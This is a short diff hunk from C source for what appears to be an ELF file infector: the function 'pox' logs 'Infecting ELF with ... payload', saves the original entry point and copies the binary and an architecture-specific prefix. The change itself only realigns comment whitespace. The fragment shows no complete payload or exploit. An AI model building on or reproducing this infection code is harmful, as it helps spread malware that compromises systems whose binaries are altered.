@@ -28,8 +28,8 @@ bool pox(const bin_t *elf, const bin_t *payload, bin_t *out, byte_t *buf_tmp, by
     DBG("Infecting ELF with %zu-byte payload\n", total_payload_len);
 
     entry = pox_get_entry(elf);                                     // save original entry point
-    pox_memcpy(buf_tmp, elf->base, elf->len);                           // copy the elf as-is
-    pox_memcpy(pfx, pox_pfx(elf), pox_pfxlen(elf));                     // copy the prefix for the target architecture
+    pox_memcpy(buf_tmp, elf->base, elf->len);                       // copy the elf as-is
+    pox_memcpy(pfx, pox_pfx(elf), pox_pfxlen(elf));                 // copy the prefix for the target architecture
 
     elf_tmp = (bin_t){                                              // create elf to manipulate prior to assembly
         .base=buf_tmp, .arch=elf->arch, .len=elf->len,
